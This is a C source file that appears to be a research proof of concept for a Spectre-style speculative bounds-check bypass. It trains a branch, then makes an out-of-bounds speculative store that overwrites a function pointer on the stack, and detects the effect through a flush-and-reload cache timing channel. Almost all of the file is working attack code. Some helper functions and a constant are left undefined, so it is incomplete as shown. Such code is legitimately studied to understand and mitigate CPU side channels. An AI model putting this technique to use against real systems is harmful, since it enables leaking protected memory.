#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include "signal.h"


#define MAX_ITERATIONS 2000

/*
 * Target gadget  never called directly (essentially dead code)
 * However, "inject" (ideally) trains the processor to think the indirect ret in the
 * retpoline in measure is going to call this function
 */
#define TARGET_FN_ADDR 0x414100401000
void target_fn(void) __attribute__((section(".targetfn")));
void end_target_fn(void);


/*
 * Defines the bandwidth we can communicate from speculative -> von neuman
 * e.g. 256 would be 1 byte of info Tradeoff here is larger bandwidth means 
 * we have to check more places in probe_buf (and flush them)
 */
//#define NUM_PROBES 256

/*
 * These define the stride length we take between probes. This thwarts a 
 * clever CPU's stride prediction (e.g. "you loaded buf[0], buf[1024], 
 * I'll load buf[2048] for you") Generally, this results in not seeing ANY 
 * winning probes in which case, we change cur_probe_space and retry.
 */
#define MAX_PROBE_SPACE (10003)

/*
 * The (heap-allocated) probe buffer
 * We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
 * in the cache to communicate the value i from speculative -> von neuman
 */
uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;

static inline __attribute__((always_inline)) void flush_probe_buf_i(){
    // Clear probe_buf from cache
    int j =0;
    for (j=0; j<NUM_PROBES; j++) {
        _mm_clflush(&probe_buf[j*cur_probe_space]);
    }
}

void flush_probe_buf(){
    // Clear probe_buf from cache
	flush_probe_buf_i();
}


// Stats
uint64_t cache_hits;    /* Number cache hits (<140 cycles read) */
uint64_t tot_runs;      /* Number of trials (i.e. 10k) */
uint64_t tot_time;      /* Number cycles total */
uint64_t results[NUM_PROBES];


/*
 * Flush and reload cache timing. Measures cache timing to find which
 * elements have been loaded during a possible speculative gadget
 * 
 * Note -- this is not the only covert channel that could be used
 * to exfiltrate information from speculative world. 
 */ 
void check_probes() {
    unsigned int junk=0;    // For rdtscp
    uint64_t t0, t1;
    uint8_t *addr;

    int i, mix_i;
    for (i=0; i<NUM_PROBES; i++) {
        mix_i = ((i* 167) +13) & NUM_PROBES-1;
        //mix_i = i;
        addr = &probe_buf[mix_i*cur_probe_space];
        t0 = _rdtscp(&junk);
        asm volatile( "movb (%%rbx), %%al\n"
            :: "b"(addr) : "rax");
        t1 = _rdtscp(&junk);
        if (t1-t0 < 140) {
            cache_hits++;
            tot_time += t1-t0;
            results[mix_i]++;
        }
    }
    tot_runs++;

    flush_probe_buf();
}


// Use Global instead of local for easier flushing?
uint64_t __attribute__((section(".max_len"))) min_len = 0;
uint64_t __attribute__((section(".max_len"))) max_len = 43;


void branch(register uint64_t* overflow, register uint64_t entry, register uint64_t index){
    // uint64_t overflow[43];
    if ((index < max_len) && (index >= min_len)) {
        //asm volatile (__signal(0x88):::"rax", "rcx", "rdx");
        //target_fn();
        overflow[index] = entry;
    }
    return;
}

int training_rounds = 2000;

void trick_branch(){
    int i=0;
    uint64_t overflow[43];
    void (*fn_ptr)(void) = check_probes;
    uint64_t good_val = 0xDEADBEEF12345678;
    uint64_t bad_val  = 0x0000000000434040;

    memset(overflow, 0x44, sizeof(overflow));
    for (i=0; i< training_rounds; i++){
        branch(overflow, good_val, i%43);
    }
    _mm_clflush(&max_len);
    _mm_clflush(&min_len);
    flush_probe_buf_i();

    branch(overflow, bad_val, 50);
    fn_ptr();
}


void measure() {
    int i, j;

    int total_runs = 0; 
    int misses = 0;
    uint64_t k = 1;
    uint64_t width = 8;
    uint64_t top_k_i[k]; 
    uint64_t top_k_res[k]; 
    uint64_t final_i;
    bool hit_miss=0;

    while (1) {
        //flush_probe_buf_i();
        for (i=0; i<MAX_ITERATIONS; i++) {
            trick_branch();
            // check_probes();
        }

        uint64_t avg = 0;
        if (cache_hits > 0) avg = tot_time/cache_hits;

        // the results array is global
        hit_miss = get_top_k(k, results, top_k_i, top_k_res, MAX_ITERATIONS, training_rounds);

        if (hit_miss){
            final_i = construct_result(k, width, top_k_i); 
            // printf("[%08lX]\n\n", final_i);

            misses = 0;
        } else {
            printf("--[]: %lu avg cycles ps %ld\n", avg, cur_probe_space);
            misses++;
            cur_probe_space += 63;
            cur_probe_space %= MAX_PROBE_SPACE;
        }
        cache_hits = 0;
        tot_runs = 0;
        tot_time = 0;

        memset(results, 0, sizeof(uint64_t)*NUM_PROBES);
        usleep(10);
        total_runs++;
        if (total_runs% 10 == 0){
            training_rounds -= 100;
        }
        if (training_rounds < 0){
            exit(0);
        }
    }

}


int main()
{
    probe_buf = malloc(MAX_PROBE_SPACE*NUM_PROBES);
    if (probe_buf == NULL) {
        perror("malloc");
        return -1;
    }

    int i =0;
    for (i=0; i<NUM_PROBES; i++) {
        memset(&probe_buf[i*MAX_PROBE_SPACE], i, MAX_PROBE_SPACE);
        _mm_clflush(&probe_buf[i*cur_probe_space]);
    }

    void * map; 
    map = malloc(1024);
    memcpy(map, target_fn, end_target_fn-target_fn);

    measure();

}
